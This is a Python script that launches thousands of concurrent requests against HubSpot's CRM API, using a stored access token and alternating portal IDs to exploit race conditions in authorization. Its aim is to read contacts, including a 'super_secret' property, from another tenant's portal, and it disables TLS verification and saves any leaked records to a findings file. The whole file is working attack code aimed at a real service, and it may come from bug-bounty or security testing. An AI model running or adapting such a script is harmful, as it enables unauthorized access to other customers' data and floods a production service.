#!/usr/bin/env python3
"""
Advanced Race Condition Attacks
Aggressive concurrent request testing to exploit TOCTOU bugs

Tests:
- 500-1000 concurrent requests to exploit timing windows
- Mixed portal context confusion
- Parallel batch operations
- Session state race conditions
"""

import requests
import json
import os
import urllib3
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
from dotenv import load_dotenv

urllib3.disable_warnings()
load_dotenv()

ACCESS_TOKEN = os.getenv('HUBSPOT_ACCESS_TOKEN')
SESSION_COOKIES = os.getenv('HUBSPOT_COOKIES')
TARGET_PORTAL = os.getenv('TARGET_PORTAL_ID', '46962361')
MY_PORTAL = os.getenv('MY_PORTAL_ID', '50708459')

print("="*80)
print("Advanced Race Condition Attacks")
print("="*80)
print("\nAggressive concurrent testing (500-1000 requests)")
print("Targets: TOCTOU bugs, context confusion, timing windows")
print("="*80)

findings = []
findings_lock = Lock()

# ============================================================================
# 1. PORTAL CONTEXT CONFUSION
# ============================================================================

def test_portal_context_race():
    """
    Send alternating requests for our portal and target portal
    to confuse authorization context
    """
    print("\n[*] Testing portal context confusion (1000 concurrent)...")

    headers = {'Authorization': f'Bearer {ACCESS_TOKEN}'}

    # Track successful target portal accesses
    successes = []
    success_lock = Lock()

    def make_request(i):
        try:
            # Alternate between our portal and target portal
            portal = TARGET_PORTAL if i % 2 == 0 else MY_PORTAL
            contact_id = i % 10 + 1

            url = f'https://api.hubapi.com/crm/v3/objects/contacts/{contact_id}'
            params = {
                'portalId': portal,
                'properties': 'firstname,super_secret,email'
            }

            r = requests.get(url, headers=headers, params=params, verify=False, timeout=5)

            # Check if we got target portal data
            if r.status_code == 200 and portal == TARGET_PORTAL:
                data = r.json()
                if 'properties' in data:
                    with success_lock:
                        successes.append({
                            'request_num': i,
                            'contact_id': contact_id,
                            'data': data
                        })
                        print(f"\n    Request {i}: SUCCESS on target portal contact {contact_id}")

                        # Check for super_secret
                        if 'super_secret' in data.get('properties', {}):
                            print(f"      *** FOUND super_secret: {data['properties']['super_secret']} ***")

        except Exception as e:
            pass

    print(f"  Launching 1000 concurrent requests...")
    start_time = time.time()

    with ThreadPoolExecutor(max_workers=100) as executor:
        futures = [executor.submit(make_request, i) for i in range(1000)]

        completed = 0
        for future in as_completed(futures):
            completed += 1
            if completed % 200 == 0:
                print(f"    Progress: {completed}/1000")

    elapsed = time.time() - start_time
    print(f"\n  Completed in {elapsed:.2f}s")
    print(f"  Successful target portal accesses: {len(successes)}")

    if successes:
        with findings_lock:
            findings.append({
                'attack': 'Portal Context Race',
                'successes': len(successes),
                'samples': successes[:5]
            })

# ============================================================================
# 2. SEARCH ENDPOINT RACE
# ============================================================================

def test_search_race():
    """
    Rapidly alternate search requests between portals
    """
    print("\n[*] Testing search endpoint race (500 concurrent)...")

    headers = {
        'Authorization': f'Bearer {ACCESS_TOKEN}',
        'Content-Type': 'application/json'
    }

    successes = []
    success_lock = Lock()

    def search_request(i):
        try:
            # Alternate portal IDs in URL and body
            url_portal = TARGET_PORTAL if i % 2 == 0 else MY_PORTAL
            body_portal = TARGET_PORTAL if i % 3 == 0 else MY_PORTAL

            url = f'https://api.hubapi.com/crm/v3/objects/contacts/search?portalId={url_portal}'

            payload = {
                'filterGroups': [],
                'properties': ['firstname', 'super_secret', 'email'],
                'limit': 10,
                'portalId': body_portal
            }

            r = requests.post(url, headers=headers, json=payload, verify=False, timeout=5)

            if r.status_code == 200:
                data = r.json()
                results = data.get('results', [])

                if results:
                    # Check if we got target portal data
                    for result in results:
                        contact_id = int(result['id'])

                        # Target portal likely has lower IDs
                        if contact_id < 50000000000:
                            with success_lock:
                                successes.append({
                                    'request_num': i,
                                    'url_portal': url_portal,
                                    'body_portal': body_portal,
                                    'contact': result
                                })
                                print(f"\n    Request {i}: Low contact ID {contact_id}")

                                props = result.get('properties', {})
                                if 'super_secret' in props:
                                    print(f"      *** FOUND super_secret: {props['super_secret']} ***")

        except Exception as e:
            pass

    print(f"  Launching 500 concurrent search requests...")
    start_time = time.time()

    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = [executor.submit(search_request, i) for i in range(500)]

        completed = 0
        for future in as_completed(futures):
            completed += 1
            if completed % 100 == 0:
                print(f"    Progress: {completed}/500")

    elapsed = time.time() - start_time
    print(f"\n  Completed in {elapsed:.2f}s")
    print(f"  Potential target portal results: {len(successes)}")

    if successes:
        with findings_lock:
            findings.append({
                'attack': 'Search Race Condition',
                'successes': len(successes),
                'samples': successes[:5]
            })

# ============================================================================
# 3. BATCH OPERATION RACE
# ============================================================================

def test_batch_race():
    """
    Send many batch requests simultaneously with mixed portal IDs
    """
    print("\n[*] Testing batch operation race (200 concurrent)...")

    headers = {
        'Authorization': f'Bearer {ACCESS_TOKEN}',
        'Content-Type': 'application/json'
    }

    url = 'https://api.hubapi.com/crm/v3/objects/contacts/batch/read'

    successes = []
    success_lock = Lock()

    def batch_request(i):
        try:
            # Mix portal IDs in different locations
            payload = {
                'properties': ['firstname', 'super_secret', 'email'],
                'inputs': [
                    {'id': str(j), 'portalId': TARGET_PORTAL if j % 2 == 0 else MY_PORTAL}
                    for j in range(1, 11)
                ],
                'portalId': TARGET_PORTAL if i % 2 == 0 else MY_PORTAL
            }

            # Add portal ID to URL too
            url_with_portal = f'{url}?portalId={TARGET_PORTAL if i % 3 == 0 else MY_PORTAL}'

            r = requests.post(url_with_portal, headers=headers, json=payload, verify=False, timeout=10)

            if r.status_code in [200, 207]:
                data = r.json()
                results = data.get('results', [])

                if results:
                    with success_lock:
                        successes.append({
                            'request_num': i,
                            'results_count': len(results),
                            'sample': results[0] if results else None
                        })

                        # Check for super_secret
                        for result in results:
                            props = result.get('properties', {})
                            if 'super_secret' in props:
                                print(f"\n    Request {i}: FOUND super_secret in contact {result['id']}")
                                print(f"      Value: {props['super_secret']}")

        except Exception as e:
            pass

    print(f"  Launching 200 concurrent batch requests...")
    start_time = time.time()

    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = [executor.submit(batch_request, i) for i in range(200)]

        completed = 0
        for future in as_completed(futures):
            completed += 1
            if completed % 50 == 0:
                print(f"    Progress: {completed}/200")

    elapsed = time.time() - start_time
    print(f"\n  Completed in {elapsed:.2f}s")
    print(f"  Successful batch operations: {len(successes)}")

    if successes:
        with findings_lock:
            findings.append({
                'attack': 'Batch Operation Race',
                'successes': len(successes),
                'samples': successes[:3]
            })

# ============================================================================
# 4. CREATE-THEN-READ RACE
# ============================================================================

def test_create_read_race():
    """
    Simultaneously create contacts and try to read them with target portal ID
    """
    print("\n[*] Testing create-then-read race (100 concurrent)...")

    headers = {
        'Authorization': f'Bearer {ACCESS_TOKEN}',
        'Content-Type': 'application/json'
    }

    successes = []
    success_lock = Lock()

    def create_and_read(i):
        try:
            # Create contact
            create_url = 'https://api.hubapi.com/crm/v3/objects/contacts'
            create_payload = {
                'properties': {
                    'email': f'race_{i}_{int(time.time())}@test.com',
                    'firstname': f'Race{i}'
                },
                'portalId': TARGET_PORTAL  # Try to create in target portal
            }

            r1 = requests.post(create_url, headers=headers, json=create_payload, verify=False, timeout=5)

            if r1.status_code == 201:
                contact_id = r1.json()['id']

                # Immediately try to read it with target portal ID
                read_url = f'https://api.hubapi.com/crm/v3/objects/contacts/{contact_id}'
                params = {
                    'portalId': TARGET_PORTAL,
                    'properties': 'firstname,super_secret,email'
                }

                r2 = requests.get(read_url, headers=headers, params=params, verify=False, timeout=5)

                if r2.status_code == 200:
                    data = r2.json()

                    # Check if portal ID in response matches target
                    url_in_response = data.get('url', '')
                    if TARGET_PORTAL in url_in_response:
                        with success_lock:
                            successes.append({
                                'request_num': i,
                                'contact_id': contact_id,
                                'data': data
                            })
                            print(f"\n    Request {i}: Created contact appears to be in target portal!")

        except Exception as e:
            pass

    print(f"  Launching 100 concurrent create-read operations...")
    start_time = time.time()

    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = [executor.submit(create_and_read, i) for i in range(100)]

        completed = 0
        for future in as_completed(futures):
            completed += 1
            if completed % 25 == 0:
                print(f"    Progress: {completed}/100")

    elapsed = time.time() - start_time
    print(f"\n  Completed in {elapsed:.2f}s")
    print(f"  Successful portal confusions: {len(successes)}")

    if successes:
        with findings_lock:
            findings.append({
                'attack': 'Create-Read Race',
                'successes': len(successes),
                'samples': successes[:3]
            })

# ============================================================================
# 5. TOKEN REFRESH RACE
# ============================================================================

def test_token_race():
    """
    Use same token simultaneously for different portals
    """
    print("\n[*] Testing token reuse race (500 concurrent)...")

    headers = {'Authorization': f'Bearer {ACCESS_TOKEN}'}

    successes = []
    success_lock = Lock()

    def token_request(i):
        try:
            # All requests use same token but different portals
            portal = TARGET_PORTAL if i % 2 == 0 else MY_PORTAL
            contact_id = (i % 100) + 1

            url = f'https://api.hubapi.com/crm/v3/objects/contacts/{contact_id}?portalId={portal}&properties=firstname,super_secret'

            r = requests.get(url, headers=headers, verify=False, timeout=5)

            if r.status_code == 200 and portal == TARGET_PORTAL:
                data = r.json()
                if 'properties' in data:
                    with success_lock:
                        successes.append({'request_num': i, 'data': data})

                        if 'super_secret' in data.get('properties', {}):
                            print(f"\n    Request {i}: *** FOUND super_secret ***")

        except Exception as e:
            pass

    print(f"  Launching 500 concurrent token requests...")
    start_time = time.time()

    with ThreadPoolExecutor(max_workers=100) as executor:
        futures = [executor.submit(token_request, i) for i in range(500)]

        completed = 0
        for future in as_completed(futures):
            completed += 1
            if completed % 100 == 0:
                print(f"    Progress: {completed}/500")

    elapsed = time.time() - start_time
    print(f"\n  Completed in {elapsed:.2f}s")
    print(f"  Successful target portal accesses: {len(successes)}")

    if successes:
        with findings_lock:
            findings.append({
                'attack': 'Token Reuse Race',
                'successes': len(successes),
                'samples': successes[:5]
            })

# ============================================================================
# MAIN EXECUTION
# ============================================================================

print("\nWARNING: This will send 2000+ requests. May trigger rate limiting.")
print("Press Ctrl+C within 5 seconds to cancel...")
time.sleep(5)

test_portal_context_race()
test_search_race()
test_batch_race()
test_create_read_race()
test_token_race()

print("\n" + "="*80)
print(f"Race Condition Testing Complete")
print(f"Findings: {len(findings)}")
print("="*80)

if findings:
    print("\n*** SUCCESSFUL RACE CONDITIONS ***\n")

    for i, finding in enumerate(findings, 1):
        print(f"{i}. {finding['attack']}")
        print(f"   Successes: {finding.get('successes', 0)}")
        print(f"   Sample: {json.dumps(finding.get('samples', [])[0] if finding.get('samples') else {}, indent=3)[:300]}...")
        print()

    with open('/home/user/Hub/findings/race_condition_findings.json', 'w') as f:
        json.dump(findings, f, indent=2)

    print("Saved to: findings/race_condition_findings.json")
else:
    print("\nNo race condition vulnerabilities found.")
    print("\nThis means:")
    print("  - Authorization is atomic (no TOCTOU window)")
    print("  - Portal context is thread-safe")
    print("  - No timing-based bypasses")
    print("  - Concurrent requests handled correctly")
